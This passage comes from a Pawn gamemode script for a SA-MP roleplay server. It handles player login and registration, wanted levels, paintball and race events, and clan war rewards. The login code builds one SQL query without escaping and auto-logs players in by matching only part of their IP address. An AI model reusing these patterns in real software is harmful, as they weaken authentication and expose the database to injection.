 		SetPlayerInterior(playerid,0);
		SetPlayerPosEx(playerid, 1597.3927,-2218.0688,23.6551);
		InterpolateCameraPos(playerid, 1734.278808, -1390.769042, 97.372825, 1526.785644, -1269.258666, 250.281906, 7000);
		InterpolateCameraLookAt(playerid, 1729.962402, -1389.471191, 99.537094, 1529.512939, -1272.746093, 247.958160, 7000);
		TogglePlayerControllable(playerid, 0);
	}
	if(gPlayerAccount[playerid] < 1)
	{
		new pnamee[25],qstr[1000];
		GetPlayerName(playerid, pnamee, sizeof(pnamee));
		format(qstr,sizeof(qstr),"SELECT * FROM users WHERE `name`='%s'",pnamee);
		new Cache: abcd = mysql_query(SQL,qstr);
		if(cache_get_row_count() > 0)
		{
			gPlayerAccount[playerid] = 1;
		}
		else
		{
			gPlayerAccount[playerid] = 0;
		}
		cache_delete(abcd);
	}
	if(gPlayerAccount[playerid] != 0)
	{
		new logareautomata2 = 0;
		new logareautomata1 = 0;
		new aratareparola = 0;
		new sqlselect[1000],rezultat[256],clasaipdb[256],clasaip[256];
		mysql_format(SQL, sqlselect, sizeof(sqlselect), "SELECT * FROM `users` WHERE `name`='%s'",GetName(playerid));
		new Cache: logareautomata = mysql_query(SQL, sqlselect);
		if(cache_get_row_count() > 0)
		{
			for(new i, j = cache_get_row_count(); i != j; i++)
			{
				cache_get_field_content(i, "clasaIP", rezultat); format(clasaipdb, sizeof(clasaipdb), rezultat);
				logareautomata1 = cache_get_field_content_int(i, "logareautomata");
				aratareparola = cache_get_field_content_int(i, "AratareParola");
			}
			if(logareautomata1 > 0) logareautomata2 = 1;
		}
		cache_delete(logareautomata);
		if(aratareparola > 0)
		{
			SCM(playerid, COLOR_SERVER, "{0066FF}Server: {FFFFFF}Given the problems encountered, please access the browser address: http://UCP.T-ZONE.IR");
			SCM(playerid, COLOR_SERVER, "{0066FF}Server: {FFFFFF}Enter your username and password at random and expect to be redirected.");
			SCM(playerid, COLOR_SERVER, "{0066FF}Server: {FFFFFF}Once redirected you will get more details on what you need to do to find the password.");
			return KickEx(playerid);
		}
		if(logareautomata2 > 0)
		{
			new ipjucator[16];
			GetPlayerIp(playerid, ipjucator, 16);
			strdel(ipjucator, 8, strlen(ipjucator));
			format(clasaip, sizeof(clasaip), "%s", ipjucator);
			if(strcmp(clasaip,clasaipdb,true) == 0)
			{
				loginautomat[playerid] = 1;
				OnPlayerLogin(playerid, "");
			}
			if(loginautomat[playerid] == 1) return 1;
		}	
		SendClientMessage(playerid, COLOR_GENANNOUNCE, "SERVER: {FFFFFF}Welcome to TopZone RPG.");
		SendClientMessage(playerid, COLOR_GENANNOUNCE, "SERVER: {FFFFFF}You already have a registered account, please enter your password into the dialog box.");
		ShowPlayerDialog(playerid,DIALOG_LOGIN2,DIALOG_STYLE_PASSWORD,"SERVER: Login","Welcome to the TopZone RPG Server.\n\nPlease enter your password below!","Login","Cancel");
	}
	else
	{
		gPlayerAccount[playerid] = 0;
		new loginname[158];
		GetPlayerName(playerid,loginname,sizeof(loginname));
		SendClientMessage(playerid, COLOR_GENANNOUNCE, "SERVER: {FFFFFF}Welcome to TopZone RPG.");
		SendClientMessage(playerid, COLOR_GENANNOUNCE, "SERVER: {FFFFFF}You aren't registered yet. Please enter your desired password in the dialog box to register.");
		ShowPlayerDialog(playerid,DIALOG_LOGIN1,DIALOG_STYLE_PASSWORD,"SERVER: Registration","Welcome to the TopZone RPG Server.\n\nPlease enter your desired password below!","Register","Cancel");
	}
	return 1;
}


public SetupPlayerForClassSelection(playerid)
{
	switch (gTeam[playerid])
	{
		case TEAM_BLUE:
		{
			SetPlayerInterior(playerid,0);
			SetPlayerPosEx(playerid,323.4,305.6,999.1);
			SetPlayerFacingAngle(playerid, 90.0);
		    SetPlayerCameraPos(playerid, 1460.0, -1324.0, 287.2);
		    SetPlayerCameraLookAt(playerid,1374.5, -1291.1, 239.0);
		}
		case TEAM_ADMIN:
		{
		    SetPlayerInterior(playerid,0);
			SetPlayerPosEx(playerid,-2654.4,1424.2,912.4);
			SetPlayerFacingAngle(playerid, 90.0);
		    SetPlayerCameraPos(playerid, 1460.0, -1324.0, 287.2);
		    SetPlayerCameraLookAt(playerid,1374.5, -1291.1, 239.0);
		}
		default:
		{
            SetPlayerPosEx(playerid,358.0976,-1841.3488,5.1257);
		    SetPlayerInterior(playerid,0);
		    SetPlayerFacingAngle(playerid, 90.0);
		    SetPlayerCameraPos(playerid, 1460.0, -1324.0, 287.2);
		    SetPlayerCameraLookAt(playerid,1374.5, -1291.1, 239.0);
		}
	}
}

public SetPlayerTeamFromClass(playerid,classid)
{
 	if (classid >= 1 && classid <= 15)
	{
		gTeam[playerid] = 15; //admin
		PlayerInfo[playerid][pTeam] = 15;
	}
	else
	{
	    gTeam[playerid] = 3;
	    PlayerInfo[playerid][pTeam] = 3;
	}
}

// SetPlayerCriminal(playerid,255, "Stealing A Police Vehicle");
public SetPlayerCriminal(playerid,declare,reason[])
{
	if(IsPlayerConnected(playerid))
	{
	    PlayerInfo[playerid][pCrimes] += 1;
	    Update(playerid,pCrimesx);
	    new points = WantedPoints[playerid],
			turned[MAX_PLAYER_NAME],
			turner[MAX_PLAYER_NAME],
			turnmes[128],
			ini;
		ini = PlayerInfo[playerid][pWantedLevel];
		GetPlayerName(playerid, turned, sizeof(turned));
		if(declare == 255)
		{
			format(turner, sizeof(turner), "Unknown");
			strmid(PlayerInfo[playerid][pVictim], turner, 0, strlen(turner), 255);
			Update(playerid,pVictimx);
		}
		else
		{
		    if(IsPlayerConnected(declare))
		    {
				GetPlayerName(declare, turner, sizeof(turner));
				strmid(PlayerInfo[playerid][pVictim], turner, 0, strlen(turner), 255);
				Update(playerid,pVictimx);
			}
		}
		new string[184];
		new y,m,d,h,mi;
		getdate(y,m,d);
		gettime(h,mi);
		if(strcmp(PlayerInfo[playerid][pCrime1], "Fara Crima", true) == 0)
		{
			format(string,sizeof(string),"%s",reason);
			strmid(PlayerInfo[playerid][pCrime1], string, 0, strlen(string), 255);
			Update(playerid,pCrime1x);
		}
		else if(strcmp(PlayerInfo[playerid][pCrime2], "Fara Crima", true) == 0)
		{
			format(string,sizeof(string),"%s",reason);
			strmid(PlayerInfo[playerid][pCrime2], string, 0, strlen(string), 255);
			Update(playerid,pCrime2x);
		}
		else if(strcmp(PlayerInfo[playerid][pCrime3], "Fara Crima", true) == 0)
		{
			format(string,sizeof(string),"%s",reason);
		    strmid(PlayerInfo[playerid][pCrime3], string, 0, strlen(string), 255);
			Update(playerid,pCrime3x);
		}
		else if(strcmp(PlayerInfo[playerid][pCrime1],  "Fara Crima", true) == 0 && strcmp(PlayerInfo[playerid][pCrime2], "Fara Crima", true) == 0 && strcmp(PlayerInfo[playerid][pCrime3], "Fara Crima", true) == 0) { }
		else
		{
			format(string,sizeof(string),"%s",reason);
		    strmid(PlayerInfo[playerid][pCrime1], string, 0, strlen(string), 255);
			Update(playerid,pCrime1x);
			format(string, sizeof(string), "Fara Crima");
			strmid(PlayerInfo[playerid][pCrime2], string, 0, strlen(string), 255);
			strmid(PlayerInfo[playerid][pCrime3], string, 0, strlen(string), 255);
			Update(playerid,pCrime2x);
			Update(playerid,pCrime3x);
		}
		if(points > 0)
		{
		    new yesno;
			if(points >= 1 && points <= 3)
			{
				if(PlayerInfo[playerid][pWantedLevel] != 1)
				{
					PlayerInfo[playerid][pWantedLevel] = 1;
					yesno = 1;
				}
			}
			else if(points >= 4 && points <= 5)
			{
				if(PlayerInfo[playerid][pWantedLevel] != 2)
				{
					PlayerInfo[playerid][pWantedLevel] = 2;
					yesno = 1;
				}
			}
			else if(points >= 6 && points <= 7)
			{
				if(PlayerInfo[playerid][pWantedLevel] != 3)
				{
					PlayerInfo[playerid][pWantedLevel] = 3;
					yesno = 1;
				}
			}
			else if(points >= 8 && points <= 9)
			{
				if(PlayerInfo[playerid][pWantedLevel] != 4)
				{
					PlayerInfo[playerid][pWantedLevel] = 4;
					yesno = 1;
				}
			}
			else if(points >= 10 && points <= 11)
			{
				if(PlayerInfo[playerid][pWantedLevel] != 5)
				{
					PlayerInfo[playerid][pWantedLevel] = 5;
					yesno = 1;
				}
			}
			else if(points >= 12 && points <= 13)
			{
				if(PlayerInfo[playerid][pWantedLevel] != 6)
				{
					PlayerInfo[playerid][pWantedLevel] = 6;
					yesno = 1;
				}
			}
			if(PlayerInfo[playerid][pWantedLevel] >= 1)
			{
				if(gTeam[playerid] == 3)
				{
					gTeam[playerid] = 3;
				}
			}
			Update(playerid,pWantedLevelx);
			wantedlost[playerid] = 1800;
			if(yesno)
			{
				ini = PlayerInfo[playerid][pWantedLevel]-ini;
				foreach(Player,i)
				{
					if(IsPlayerConnected(i))
					{
					    if(PlayerInfo[i][pMember] == 1||PlayerInfo[i][pLeader] == 1 || PlayerInfo[i][pMember] == 2 || PlayerInfo[i][pLeader] == 2 || PlayerInfo[i][pMember] == 3 || PlayerInfo[i][pLeader] == 3 || PlayerInfo[i][pMember] == 8 || PlayerInfo[i][pLeader] == 8 || PlayerInfo[i][pMember] == 15 || PlayerInfo[i][pLeader] == 15)
					    {
							format(cbjstore, sizeof(turnmes), "Dispatch: %s [%d] has commited a crime: %s. Reporter: %s. W: +%d. New wanted level: %d.",turned,playerid,reason,turner,ini,PlayerInfo[playerid][pWantedLevel]);
							SendClientMessage(i, COLOR_DBLUE, cbjstore);
						}
					}
				}
				format(turnmes, sizeof(turnmes), "You committed a crime: %s, Reporter: %s. W: +%d. New wanted level: %d.",reason,turner,ini,PlayerInfo[playerid][pWantedLevel]);
				SendClientMessage(playerid, COLOR_RED2, turnmes);
			}
		}
	}
	return 1;
}
public OtherTimer()
{
	new string[1000],sendername[30];
	if(last1Min > 0)
 	{
	    last1Min--;
	    format(MGLOBAL, sizeof(MGLOBAL), "hostname TopZone: -Server online in: %d seconds", last1Min);
	    SendRconCommand(MGLOBAL);
	    if(last1Min == 0)
	    {
	    	SendRconCommand("hostname TopZone: -Server online!");
	    	SendRconCommand("password 0");
	    	last1Min = -1;
	    }
	}		
	if(paint_jucatori > 1)
 	{
    	if(paint_incepe > 0)
     	{
      		paint_incepe--;
			foreach(Player, i)
			{
			    if(PlayerInfo[i][pPaintBallG] == 1)
	    		{
					format(string, sizeof(string), "RUNDA_INCEPE_IN:_%d_SECUNDE",paint_incepe);
					PlayerTextDrawSetString(i, PaintTD[3], string);
					PlayerTextDrawShow(i, PaintTD[3]);
				}
			}
		}
		if(paint_incepe == 0)
		{
		    paint_incepe = -1;
			timp_paint = 300;
			PaintBallWinnerKills = 0;
			foreach(Player, playerid)
			{
				if(PlayerInfo[playerid][pPaintBallG] == 1)
	    		{
					SCM(playerid, -1, "{0066FF}PaintBall: {FFFFFF}Paintball round began!");
					TogglePlayerControllable(playerid, 1);
					SetCameraBehindPlayer(playerid);
					for(new i = 0; i < sizeof(PaintTD); i++) { PlayerTextDrawHide(playerid, PaintTD[i]); }
					PlayerInfo[playerid][pPaintBallKills] = 0;
					new tero = 0;
					new ctero = 0;
					foreach(Player, i)
					{
						if(T_SAU_CT[i] == 1) { tero++; }
						if(T_SAU_CT[i] == 2) { ctero++; }
					}
					format(string, sizeof(string), "Scorul_tau:_~r~%d",PlayerInfo[playerid][pPaintBallKills]);
					PlayerTextDrawSetString(playerid, PaintTD[5], string);
					format(string, sizeof(string), "Round ends in ~r~%s",CalculeazaTimp2(timp_paint));
					PlayerTextDrawSetString(playerid, PaintTD[6], string);
					format(string, sizeof(string), "TERRORISTS:_~r~%d_~w~/_Counter-terrorist:_~R~%d",tero,ctero);
					PlayerTextDrawSetString(playerid, PaintTD[7], string);
					PlayerTextDrawSetString(playerid, PaintTD[3], "OMOARA_JUCATORII_DIN_ECHIPA_ADVERSA");
					AscundeTD[playerid] = 8;
					for(new i = 0; i < sizeof(PaintTD); i++) { PlayerTextDrawShow(playerid, PaintTD[i]); }
					PlayerTextDrawHide(playerid, PaintTD[1]);
				}	
			}
			if(paint_jucatori > 1)
			{
				format(string, sizeof(string), "{0066FF}PaintBall: {FFFFFF}%d players fight in arena paintball.",paint_jucatori);
				SendClientMessageToAll(-1, string);
			}
		}
		if(timp_paint > 0)
		{
			timp_paint--;
			foreach(Player, playerid)
			{
				if(PlayerInfo[playerid][pPaintBallG] == 1)
	    		{
					format(string, sizeof(string), "Scorul_tau:_~r~%d",PlayerInfo[playerid][pPaintBallKills]);
					PlayerTextDrawSetString(playerid, PaintTD[5], string);
					format(string, sizeof(string), "Round ends in ~r~%s",CalculeazaTimp2(timp_paint));
					PlayerTextDrawSetString(playerid, PaintTD[6], string);
					new tero = 0;
					new ctero = 0;
					foreach(Player, i)
					{
						if(T_SAU_CT[i] == 1) { tero++; }
						if(T_SAU_CT[i] == 2) { ctero++; }
					}
					format(string, sizeof(string), "TERRORISTS:_~r~%d_~w~/_Counter-terrorist:_~R~%d",tero,ctero);
					PlayerTextDrawSetString(playerid, PaintTD[7], string);
					PlayerTextDrawShow(playerid, PaintTD[5]);
					PlayerTextDrawShow(playerid, PaintTD[6]);
					PlayerTextDrawShow(playerid, PaintTD[7]);
				}
			}
			if(timp_paint == 1)
			{
				new scor_ct  = 0;
				new scor_t = 0;
				foreach(Player, playerid)
				{
					if(PlayerInfo[playerid][pPaintBallG] == 1)
					{
						if(T_SAU_CT[playerid] == 1) { scor_t+=PlayerInfo[playerid][pPaintBallKills]; }
						if(T_SAU_CT[playerid] == 2) { scor_ct+=PlayerInfo[playerid][pPaintBallKills]; }
						timp_paint = -1;
						for(new i = 0; i < sizeof(PaintTD); i++) { PlayerTextDrawHide(playerid, PaintTD[i]); }
						T_SAU_CT[playerid] = -1;
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerPos(playerid, 1154.4122,-1440.0548,15.7969);
						PlayerInfo[playerid][pPaintBallG] = -1;
						SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
						ResetPlayerWeapons(playerid);
						for(new i = 0; i != 5; ++i) SendDeathMessageToPlayer(playerid, 1001, 1001, 1001);
						SetPlayerToTeamColor(playerid);
					}
				}
				if(scor_ct > scor_t)
				{
					format(string, sizeof(string), "{0066FF}PaintBall: {FFFFFF}Counter-terrorist team won the game Paintball (%s killing).",FormatNumber(scor_ct));
					SendClientMessageToAll(-1, string);
				}
				if(scor_ct < scor_t)
				{
					format(string, sizeof(string), "{0066FF}PaintBall: {FFFFFF}Terrorist team won the game Paintball (%s killing).",FormatNumber(scor_t));
					SendClientMessageToAll(-1, string);
				}
				paint_jucatori = 0;
			}
		}
  	}
	if(paint_jucatori == 1)
	{
		timp_paint = -1;
		if(paint_incepe > 0)
		{
			paint_incepe = -1;
			foreach(Player, i)
			{
			    if(PlayerInfo[i][pPaintBallG] == 1)
	    		{
					for(new x = 0; x < sizeof(PaintTD); x++) { PlayerTextDrawHide(i, PaintTD[x]); }
					format(string, sizeof(string), "SE_ASTEAPTA_JUCATORI...");
					PlayerTextDrawSetString(i, PaintTD[3], string);
					PlayerTextDrawShow(i, PaintTD[0]);
					PlayerTextDrawShow(i, PaintTD[1]);
					PlayerTextDrawShow(i, PaintTD[2]);
					PlayerTextDrawShow(i, PaintTD[3]);
				}
			}
		}
	}
	if(paint_jucatori < 1) { timp_paint = -1; paint_incepe = -1; paint_jucatori = 0; }
	if(pozitienoua >= 14) pozitienoua = 0;
	if(timercursa > 0)
	{
		timercursa--;
		if(timercursa == 123455)
		{
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i) && racingcar[i] >= 0)
				{
					SCM(i, COLOR_SERVER, "Race begins: 3");
				}
			}	
		}
		if(timercursa == 123454)
		{
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i) && racingcar[i] >= 0)
				{
					SCM(i, COLOR_SERVER, "Race begins: 2");
				}
			}
		}
		if(timercursa == 123453)
		{
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i) && racingcar[i] >= 0)
				{
					SCM(i, COLOR_SERVER, "Race begins: 1");
				}
			}
		}
		if(timercursa == 123452)
		{
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i) && racingcar[i] >= 0)
				{
					SCM(i, COLOR_SERVER, "The race started: Go! Go! Go!");
					TogglePlayerControllable(i, 1);
				}
			}
			timercursa = -1;
		}
	}
	if(timercursa == 0)
	{
		timercursa = -1;
		new nrjucatoriincursa = 0;
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i) && racingcar[i] >= 0)
			{
				nrjucatoriincursa++;
			}
		}
		if(nrjucatoriincursa > 1)
		{
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i) && racingcar[i] >= 0)
				{
					SetPlayerRaceCheckpoint(i,1, -1657.0801,555.2089,39.0662,0.0,0.0,0.0, 4.0);
					SCM(i, COLOR_SERVER, "{FF6347}type the command [/engine] to start the engine!");
					CP[i] = 123456;
				}
			}
			timercursa = 123456;
			format(string, sizeof(string), "News: %d players compete in arena racing (Fun area)!",nrjucatoriincursa);
			SendClientMessageToAll(COLOR_ORANGE, string);
			
		}
		else
		{
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i) && racingcar[i] >= 0)
				{
					SCM(i, COLOR_ERROR, "Race can not start because a period of 30 seconds have entered at least 2 players.");
					DisableRemoteVehicleCollisions(i, 0);
					DisablePlayerRaceCheckpoint(i);
					CP[i] = 0;
					SetVehicleVirtualWorld(racingcar[i], 0);
					DestroyVehicle(racingcar[i]);
					SetPlayerVirtualWorld(i, 0);
					TogglePlayerControllable(i, 1);
					racingcar[i] = -1;
					SetPlayerPos(i, 1154.4122,-1440.0548,15.7969);
				}
			}
		}
	}
	if(incarcaatmtimer > 0)
	{
	    incarcaatmtimer--;
	}
	if(incarcaatmtimer == 0)
	{
	    incarcaatmtimer = -1;
	    for(new id; id < sizeof(ATM); id++)
	    {
	        DestroyDynamicObject(ObjectATM[id]);
		    DestroyDynamic3DTextLabel(TabeleATM[id]);
	    }
   		incarcaATM();
	}
	if(incarcabradtimer > 0) incarcabradtimer--;
	if(incarcabradtimer == 0)
	{
		incarcabradtimer = -1;
		for(new id; id < sizeof(Brad); id++)
	    {
	        DestroyDynamicObject(ObjectBrad[id]);
	    }
   		//IncarcaBrazi();
	}
	/*if(incarcaomdezapada > 0) incarcaomdezapada--;
	if(incarcaomdezapada == 0)
	{
		incarcaomdezapada = -1;
   		IncarcaOmZapada();
	}*/
	for(new clan = 0; clan < 2000; clan++)
	{
		if(ClanWar[clan][cClanTime] > 0)
		{
			ClanWar[clan][cClanTime]--;
			new cid = clan;
			new idc = ClanWar[clan][cClanAttacker];
			new Float:hp1 = 0, Float:hp2 = 0;
			for(new pid = 0; pid < MAX_PLAYERS; pid++)
			{
				if(incwar[pid] == cid && mortcwar[pid] == 0)
				{
					new Float: viata;
					GetPlayerHealthEx(pid, viata);
					hp1 += viata;
				}
				if(incwar[pid] == idc && mortcwar[pid] == 0)
				{
					new Float: viata;
					GetPlayerHealthEx(pid, viata);
					hp2 += viata;						
				}
			}
			for(new pid = 0; pid < MAX_PLAYERS; pid++)
			{
				if(incwar[pid] == cid && mortcwar[pid] == 0 || incwar[pid] == idc && mortcwar[pid] == 0)
				{
					format(MGLOBAL, sizeof(MGLOBAL), "%s_CLAN_HP:_%f",ClanInfo[cid][cClanTag],hp1);
					PlayerTextDrawSetString(pid, CWarTD[3], MGLOBAL);
					format(MGLOBAL, sizeof(MGLOBAL), "%s_CLAN_HP:_%f",ClanInfo[idc][cClanTag],hp2);
					PlayerTextDrawSetString(pid, CWarTD[4], MGLOBAL);
					format(MGLOBAL, sizeof(MGLOBAL), "CLAN_WAR_TIME:_%s",CalculeazaTimp2(ClanWar[cid][cClanTime]));
					PlayerTextDrawSetString(pid, CWarTD[5], MGLOBAL);
					PlayerTextDrawShow(pid, CWarTD[3]);
					PlayerTextDrawShow(pid, CWarTD[4]);
					PlayerTextDrawShow(pid, CWarTD[5]);
				}	
			}
			if(hp1 < 1.00 || hp2 < 1.00) ClanWar[clan][cClanTime] = 1;
			if(ClanWar[clan][cClanTime] == 1)
			{
				ClanWar[clan][cClanTime] = 0;
				if(ClanInfo[clan][cClanVerificat] == 1)
				{
					new echipacastigatoare;
					if(hp1 > hp2) echipacastigatoare = 1;
					if(hp1 < hp2) echipacastigatoare = 2;
					if(echipacastigatoare == 1)
					{
						ClanInfo[cid][cClanScor]++;
						new stringyy[512];
						mysql_format(SQL, stringyy, sizeof(stringyy), "UPDATE `clans` SET `ClanScor`='%d' WHERE `clanID`='%d'",ClanInfo[cid][cClanScor],cid);
						mysql_tquery(SQL, stringyy, "", "");
						format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Clan War: {FFFFFF}Clan %s He won the fight.",ClanInfo[cid][cClanTag]);
						SendToClan(cid, COLOR_SERVER, MGLOBAL);
						SendToClan(idc, COLOR_SERVER, MGLOBAL);
						for(new pid = 0; pid < MAX_PLAYERS; pid++)
						{
							if(IsPlayerConnected(pid))
							{
								if(PlayerInfo[pid][pClan] == cid)
								{
									new bani = 100000 * ClanInfo[cid][cClanScor];
									new pp = ClanInfo[cid][cClanScor];
									GivePlayerCash(pid, bani);
									PlayerInfo[pid][pPremiumPoints] += pp;
									Update(pid, pCashx);
									Update(pid, pPremiumPointsx);
									new armanoua[1000];
									format(armanoua, sizeof(armanoua), "");
									if(ClanInfo[cid][cClanScor] == 3) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: ShotGun");
									if(ClanInfo[cid][cClanScor] == 6) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: Uzi");
									if(ClanInfo[cid][cClanScor] == 9) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: MP5");
									if(ClanInfo[cid][cClanScor] == 12)format(armanoua, sizeof(armanoua), "Your clan now has a new weapon AK47");
									if(ClanInfo[cid][cClanScor] == 20) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: M4");
									if(ClanInfo[cid][cClanScor] == 30) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: TEC9");
									format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}Your clan win the war.\n\
									Score clan bring more and larger prizes.\nClan score: {FFFFFF}%s\n\n\
									You Got $%s\nYou Got %s points Premium\n%s",FormatNumber(ClanInfo[cid][cClanScor]),FormatNumber(bani), FormatNumber(pp),armanoua);
									ShowPlayerDialog(pid, DIALOG_CLANWAR+1, DIALOG_STYLE_MSGBOX, "reward War", MGLOBAL, "OK", "");
								}
							}
						}
					}
					if(echipacastigatoare == 2)
					{
						ClanInfo[idc][cClanScor]++;
						new stringyy[512];
						mysql_format(SQL, stringyy, sizeof(stringyy), "UPDATE `clans` SET `ClanScor`='%d' WHERE `clanID`='%d'",ClanInfo[idc][cClanScor],idc);
						mysql_tquery(SQL, stringyy, "", "");
						format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Clan War: {FFFFFF}Clan %s He won the fight.",ClanInfo[idc][cClanTag]);
						SendToClan(cid, COLOR_SERVER, MGLOBAL);
						SendToClan(idc, COLOR_SERVER, MGLOBAL);
						for(new pid = 0; pid < MAX_PLAYERS; pid++)
						{
							if(IsPlayerConnected(pid))
							{
								if(PlayerInfo[pid][pClan] == idc)
								{
									new bani = 100000 * ClanInfo[idc][cClanScor];
									new pp = ClanInfo[idc][cClanScor];
									GivePlayerCash(pid, bani);
									PlayerInfo[pid][pPremiumPoints] += pp;
									Update(pid, pCashx);
									Update(pid, pPremiumPointsx);
									new armanoua[1000];
									format(armanoua, sizeof(armanoua), "");
									if(ClanInfo[idc][cClanScor] == 3) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: ShotGun");
									if(ClanInfo[idc][cClanScor] == 6) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: Uzi");
									if(ClanInfo[idc][cClanScor] == 9) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: MP5");
									if(ClanInfo[idc][cClanScor] == 12)format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: AK47");
									if(ClanInfo[idc][cClanScor] == 20) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: M4");
									if(ClanInfo[idc][cClanScor] == 30) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: TEC9");
									format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}Your clan win the war.\n\
									Score clan bring more and larger prizes.\nClan score: {FFFFFF}%s\n\n\
									You Got $%s\nYou Got %s points Premium\n%s",FormatNumber(ClanInfo[idc][cClanScor]),FormatNumber(bani), FormatNumber(pp),armanoua);
									ShowPlayerDialog(pid, DIALOG_CLANWAR+1, DIALOG_STYLE_MSGBOX, "reward War", MGLOBAL, "OK", "");
								}
							}
						}	
					}
					for(new pid = 0; pid < MAX_PLAYERS; pid++)
					{
						if(IsPlayerConnected(pid))
						{
							if(incwar[pid] == cid || incwar[pid] == idc)
							{
								incwar[pid] = 0;
								SpawnPlayer(pid);
								mortcwar[pid] = -1;
								for(new x = 0; x < sizeof(CWarTD); x++) PlayerTextDrawHide(pid, CWarTD[x]);
							}
						}
					}
				}	
			}
		}
		else
		{
			new clan2 = ClanWar[clan][cClanAttacker];
			if(ClanWar[clan2][cClanTime] > 0)
			{
				new cid = clan2;
				new idc = ClanWar[clan2][cClanAttacker];
				new Float:hp1 = 0, Float:hp2 = 0;
				for(new pid = 0; pid < MAX_PLAYERS; pid++)
				{
					if(incwar[pid] == cid && mortcwar[pid] == 0)
					{
						new Float: viata;
						GetPlayerHealthEx(pid, viata);
						hp1 += viata;
					}
					if(incwar[pid] == idc && mortcwar[pid] == 0)
					{
						new Float: viata;
						GetPlayerHealthEx(pid, viata);
						hp2 += viata;						
					}
				}
				for(new pid = 0; pid < MAX_PLAYERS; pid++)
				{
					if(incwar[pid] == cid && mortcwar[pid] == 0 || incwar[pid] == idc && mortcwar[pid] == 0)
					{
						format(MGLOBAL, sizeof(MGLOBAL), "%s_CLAN_HP:_%f",ClanInfo[cid][cClanTag],hp1);
						PlayerTextDrawSetString(pid, CWarTD[3], MGLOBAL);
						format(MGLOBAL, sizeof(MGLOBAL), "%s_CLAN_HP:_%f",ClanInfo[idc][cClanTag],hp2);
						PlayerTextDrawSetString(pid, CWarTD[4], MGLOBAL);
						format(MGLOBAL, sizeof(MGLOBAL), "CLAN_WAR_TIME:_%s",CalculeazaTimp2(ClanWar[cid][cClanTime]));
						PlayerTextDrawSetString(pid, CWarTD[5], MGLOBAL);
						PlayerTextDrawShow(pid, CWarTD[3]);
						PlayerTextDrawShow(pid, CWarTD[4]);
						PlayerTextDrawShow(pid, CWarTD[5]);
					}	
				}
				if(hp1 < 1.00 || hp2 < 1.00) ClanWar[clan2][cClanTime] = 1;
				if(ClanWar[clan2][cClanTime] == 1)
				{
					ClanWar[clan2][cClanTime] = 0;
					if(ClanInfo[clan2][cClanVerificat] == 1)
					{
						new echipacastigatoare;
						if(hp1 > hp2) echipacastigatoare = 1;
						if(hp1 < hp2) echipacastigatoare = 2;
						if(echipacastigatoare == 1)
						{
							ClanInfo[cid][cClanScor]++;
							new stringyy[512];
							mysql_format(SQL, stringyy, sizeof(stringyy), "UPDATE `clans` SET `ClanScor`='%d' WHERE `clanID`='%d'",ClanInfo[cid][cClanScor],cid);
							mysql_tquery(SQL, stringyy, "", "");
							format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Clan War: {FFFFFF}Clan %s He won the fight.",ClanInfo[cid][cClanTag]);
							SendToClan(cid, COLOR_SERVER, MGLOBAL);
							SendToClan(idc, COLOR_SERVER, MGLOBAL);
							for(new pid = 0; pid < MAX_PLAYERS; pid++)
							{
								if(IsPlayerConnected(pid))
								{
									if(PlayerInfo[pid][pClan] == cid)
									{
										new bani = 100000 * ClanInfo[cid][cClanScor];
										new pp = ClanInfo[cid][cClanScor];
										GivePlayerCash(pid, bani);
										PlayerInfo[pid][pPremiumPoints] += pp;
										Update(pid, pCashx);
										Update(pid, pPremiumPointsx);
										new armanoua[1000];
										format(armanoua, sizeof(armanoua), "");
										if(ClanInfo[cid][cClanScor] == 3) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: ShotGun");
										if(ClanInfo[cid][cClanScor] == 6) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: Uzi");
										if(ClanInfo[cid][cClanScor] == 9) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: MP5");
										if(ClanInfo[cid][cClanScor] == 12)format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: AK47");
										if(ClanInfo[cid][cClanScor] == 20) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: M4");
										if(ClanInfo[cid][cClanScor] == 30) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: TEC9");
										format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}Your clan win the war.\n\
										Score clan bring more and larger prizes.\nClan Score: {FFFFFF}%s\n\n\
										You Got $%s\nYou Got %s Premium Points\n%s",FormatNumber(ClanInfo[cid][cClanScor]),FormatNumber(bani), FormatNumber(pp),armanoua);
										ShowPlayerDialog(pid, DIALOG_CLANWAR+1, DIALOG_STYLE_MSGBOX, "Reward War", MGLOBAL, "OK", "");
									}
								}
							}
						}
						if(echipacastigatoare == 2)
						{
							ClanInfo[idc][cClanScor]++;
							new stringyy[512];
							mysql_format(SQL, stringyy, sizeof(stringyy), "UPDATE `clans` SET `ClanScor`='%d' WHERE `clanID`='%d'",ClanInfo[idc][cClanScor],idc);
							mysql_tquery(SQL, stringyy, "", "");
							format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Clan War: {FFFFFF}Clan %s He won the fight.",ClanInfo[idc][cClanTag]);
